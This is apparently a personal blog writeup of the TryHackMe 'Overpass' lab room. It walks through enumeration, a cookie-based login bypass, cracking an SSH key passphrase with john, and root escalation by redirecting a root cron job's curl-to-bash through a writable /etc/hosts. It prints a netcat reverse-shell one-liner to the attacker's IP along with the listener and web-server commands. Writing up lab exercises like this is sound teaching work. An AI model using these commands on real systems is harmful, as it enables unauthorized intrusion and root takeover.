---
layout: default
---
# Overpass Writeup

This is my writeup for the room [Overpass](https://tryhackme.com/room/overpass) in tryhackme. Hope it helps you :D

## Enumeration

First we'll start scanning ports with nmap.

```
nmap -A -sC -v <MACHINE_IP>
```

![Nmap Results](/assets/images/overpass/nmap-results.png)

Okay, we have ssh and a web server running, lets take a look at the website.

The web server is running the site Overpass where you can download the source code of their password manager and see information about them, i couldn't find anything looking at the source code of the pages so i went on to scan the directories of the site.

![Gobuster Results](/assets/images/overpass/gobuster-results.png)

Oh look, a /admin directory, thats certainly interesting, it is a login page.

## Broken Authentication

Okay, in this part i got a litte bit stuck, i tried sql injection, tried a little bit of brute forcing with the names in the aboutus page, read over and over the password manager source code and the javascript files.

I was frustrated thinking to myself that just when i thought i was getting the hang in penetration testing i couldn't even do an easy room. So i started trying things that in my head made no sense but screw it.

So let's take a look in the login.js file.

![login.js](/assets/images/overpass/login.js.png)

This login function sends a post request to /api/login and if the credentials are correct, it stores a cookie called SessionToken.

Then i set the cookie SessionToken in my browser with a random value... And it worked.

Okay, when it worked it didn't made a lot of sense to me, i thought "who in their right minds would just check if a cookie is set and not validate it to let the user log in", thats when i went to see some small web apps i made in the past and saw that this is probably more common than i thought.

But okay, now we see this beautiful page.

![Admin Page](/assets/images/overpass/admin-page.png)

## Enter the machine with SSH

Poor james can't remember his password, and now we have his SSH key. Lets try lo login in ssh with it.

![SSH Login Try](/assets/images/overpass/ssh-login-try.png)

It needs a password so we'll bruteforce it.

I used john the ripper to crack it because i dont know another way to do it, so first we use ssh2john to get the hash of the password.

![ssh2john](/assets/images/overpass/ssh2john.png)

And then i use john to crack the hash.

![password](/assets/images/overpass/pass.png)

Now we log in the machine and there is the first flag.

![user.txt](/assets/images/overpass/user.txt.png)

## Privilege escalation

Okay, first things first lets read this todo.txt file, okay, in the file james says something about storing his password in their password manager so i searched for an overpass file and i found it in /usr/bin/overpass and executing it we can get james password, but it doesnt help us with privilege escalation.

The interesting part of the todo.txt file is where it says something about an automated build script, so i decided to check /etc/crontab and over there i found this.

```
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

This executes the script located on overpass.thm/downloads/src/buildscript.sh every minute as root, interesting ...

So i ran linpeas on the machine and it shows that there is a interesting file that we have the privileges to write.

![linpeas](/assets/images/overpass/linpeas.png)

When i saw this i found it suuuper cool, i loved the idea of using /etc/hosts file to change the webserver that the machine will send a request.

So i went back to my machine and made the file downloads/src/buildscript.sh and inside the file i used a reverse shell from [PentestMonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```
mkdir downloads
mkdir downloads/src
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_VPN_IP> 1234 >/tmp/f" > downloads/src/buildscript.sh
```

Then i started a python webserver on my machine.

```
sudo python3 -m http.server 80
```

In another terminal i started a netcat listener on port 1234

```
nc -lvnp 1234
```

And then in the remote machine i edited the /etc/hosts and changed the ip of overpass.thm to the ip of my machine.

![/etc/hosts](/assets/images/overpass/hosts.png)

Now we wait until the script gets executed and we can get a reverse shell as root.

![root.txt](/assets/images/overpass/root.txt.png)

And there we have it, the root flag.

This is my first writeup and i hope it helps you that is reading it, i had a lot of fun doing this room and wanted to thanks [James](https://tryhackme.com/p/NinjaJc01) for doing it because his rooms are awesome :DD
